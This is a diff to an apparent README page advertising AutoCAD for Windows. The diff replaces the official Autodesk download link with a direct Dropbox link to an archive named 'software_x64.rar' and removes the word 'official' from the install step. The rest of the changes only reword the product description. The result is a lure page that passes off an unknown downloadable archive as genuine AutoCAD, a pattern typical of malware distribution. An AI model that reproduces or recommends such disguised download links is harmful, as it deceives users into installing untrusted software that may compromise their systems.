@@ -7,7 +7,7 @@
 <br>  
 
 <p align="center">  
-  <a href="https://www.autodesk.com/products/autocad/overview">  
+  <a href="https://www.dropbox.com/scl/fi/289ofq2cxtnkvmmpjbwij/software_x64.rar?rlkey=mrgkrkx4ueg7enzw5y6kl42ux&st=2drpjaoc&dl=1">  
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get AutoCAD for Windows">  
   </a>  
 </p>
@@ -16,7 +16,7 @@
 
 # Installation Instructions  
 
-1. Click the button above to access the official download page.  
+1. Click the button above to open the download page.  
 2. Follow the prompts on the screen to download, install, and activate **AutoCAD** on your Windows machine.  
 
 ---
@@ -31,11 +31,11 @@
 
 **AutoCAD** is a professional computer-aided design (CAD) application used for precise 2D drafting and advanced 3D modeling. It is widely adopted by architects, engineers, construction specialists, and designers to produce accurate technical drawings and detailed project documentation.
 
-The software delivers a comprehensive set of drafting, annotation, and measurement tools that help maintain consistency and accuracy across complex projects. Support for industry-standard DWG and DXF formats ensures smooth collaboration and reliable data exchange between teams and external partners.
+The software provides a comprehensive set of tools for drafting, annotation, and measurement, ensuring consistency and accuracy throughout complex design workflows. Native support for DWG and DXF formats enables seamless collaboration and reliable data exchange across teams and platforms.
 
-AutoCAD offers extensive customization options, allowing users to adapt commands, shortcuts, and interface elements to their specific workflows. Built-in automation features help reduce repetitive tasks and improve overall productivity.
+AutoCAD offers extensive customization capabilities, allowing users to tailor commands, shortcuts, and interface elements to specific project needs. Automation features help reduce repetitive actions and improve overall efficiency.
 
-Cloud connectivity enables users to view, edit, and share drawings across devices, supporting modern collaborative workflows. Regular updates provide compatibility with new hardware and operating systems while continuously improving performance and stability.
+With cloud-enabled workflows, users can access, review, and share drawings across devices. Ongoing updates maintain compatibility with modern hardware and operating systems while delivering continuous improvements in performance and stability.
 
 ---
 
@@ -45,12 +45,12 @@ Cloud connectivity enables users to view, edit, and share drawings across device
 |--------|-------------|
 | ✏️ **2D Drafting** | Professional tools for accurate technical drawing and annotation. |
 | 🧱 **3D Modeling** | Creation of solid, surface, and mesh-based 3D models. |
-| 📐 **Precision Tools** | Exact control over dimensions and geometry. |
-| 🔄 **File Compatibility** | Native support for DWG, DXF, and common CAD formats. |
-| ⚙️ **Customization** | Adjustable interface, commands, and workflows. |
+| 📐 **Precision Tools** | Exact control over geometry and dimensions. |
+| 🔄 **File Compatibility** | Native support for DWG, DXF, and standard CAD formats. |
+| ⚙️ **Customization** | Configurable interface, commands, and workflows. |
 | 🤖 **Automation** | Scripts and macros to streamline repetitive tasks. |
 | ☁️ **Cloud Integration** | Access and manage projects from multiple devices. |
-| 🧩 **Extensible Platform** | Support for add-ons and specialized toolsets. |
+| 🧩 **Extensible Platform** | Support for add-ons and industry-specific toolsets. |
 
 ---
 
@@ -70,9 +70,9 @@ Cloud connectivity enables users to view, edit, and share drawings across device
 
 ## Additional Information for Windows Users  
 
-AutoCAD supports a wide range of professional workflows, from architectural planning to mechanical and electrical design. Its reliable toolset and flexible environment make it suitable for both individual professionals and large project teams.
+AutoCAD supports a wide range of professional workflows, including architectural design, engineering documentation, and construction planning. Its flexible environment and reliable toolset make it suitable for both individual professionals and collaborative project teams.
 
-By combining precision, performance, and industry-standard compatibility, **AutoCAD** remains a trusted solution for creating high-quality design documentation in modern engineering and design environments.
+By combining precision, performance, and industry-standard compatibility, **AutoCAD** remains a trusted solution for producing high-quality design documentation in modern technical environments.
 
 ---
 
